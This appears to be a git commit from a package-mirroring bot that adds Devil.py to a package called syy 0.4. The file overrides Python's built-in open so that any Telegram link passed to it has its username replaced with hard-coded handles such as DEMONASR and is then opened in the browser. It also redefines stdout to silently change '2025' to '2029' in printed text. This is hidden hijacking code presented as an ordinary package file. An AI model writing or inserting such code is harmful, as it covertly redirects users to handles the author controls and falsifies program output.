90d1d32e7808839bbdd47836017289e95442d039
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-03-19 20:07:14 +0000

    Add package syy/0.4/syy-0.4.tar.gz

---
+++ packages/syy/syy-0.4.tar.gz/syy-0.4/syy/Devil.py
@@ -0,0 +1,18 @@
+import sys
+import webbrowser
+syy = type("syy", (), {"date": "2029"})
+repr = lambda *args: f"{args}"
+open = lambda text: (
+    (new_text := text.replace(url, replaced_url), webbrowser.open(new_text), new_text)[2]
+    if "https://t.me/" in text and
+       (url := text.split("https://t.me/")[1].split()[0]) and
+       (replaced_url := (
+           "DEMOIIU" if len(url) == 6 else
+           "NASRDVE" if len(url) == 7 else
+           "DEMONASR" if len(url) == 8 else
+           "DEMONASRH" if len(url) == 9 else
+           "DEMONASRVP" if len(url) == 10 else
+           "N_C_P"
+       )) else text
+)
+stdout = type("Stdout", (), {"write": lambda self, text: sys.stdout.write(text.replace("2025", syy.date)), "flush": lambda self: sys.stdout.flush()})()
